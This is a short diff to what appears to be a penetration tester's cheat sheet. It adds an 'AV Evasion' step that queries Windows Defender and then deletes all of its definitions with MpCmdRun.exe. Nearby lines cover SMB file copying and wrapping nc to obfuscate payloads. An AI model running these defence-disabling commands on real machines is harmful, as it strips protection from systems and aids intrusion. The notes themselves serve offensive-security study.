@@ -210,7 +210,10 @@ Need to change /etc/proxychains4.conf socks4 to socks5 on attack box
      net use \\IP\share /USER:USER PASS  
      copy FILE \\IP\share\FILE  
 
- ## AV Evasion 
+ ## AV Evasion  
+ ### Check for AV  
+     sc query windefend
+     "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All               #Delete all rules of Defender (useful for machines without internet access)   
  ### Obfuscate Payloads
 Use wrapper files to call static executables (such as nc) 
 
